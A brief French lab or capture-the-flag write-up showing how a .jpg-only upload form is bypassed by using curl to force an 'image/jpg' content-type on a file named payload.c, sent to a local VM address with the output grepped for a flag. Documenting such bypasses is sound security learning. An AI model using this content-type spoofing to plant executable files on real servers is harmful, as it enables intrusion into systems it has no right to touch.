# Upload file

Seul les fichiers **.jpg/.jpeg** son accepté, il est possible via une **commande CURL** d'indiqué manuellement/forcer le content-type d'un fichier envoyé.

#### ManCurl:
>https://curl.se/docs/manpage.html#-F

#### Changing content type of a file in a FormData request with cURL:
> https://ryanseddon.com/hacking/content-type-formdata-curl/


Commande CURL:

```
curl -X POST -F "Upload=Upload" --form "uploaded=@/mnt/nfs/homes/jereligi/Pictures/Screenshots/payload.c;type=image/jpg"  http://192.168.56.102/\?page\=upload\# | grep flag
```

On peut donc envoyer n'importe quel fichier (.c, .js, .php...) et indiquer qu'il s'agit d'un fichier .jpg.
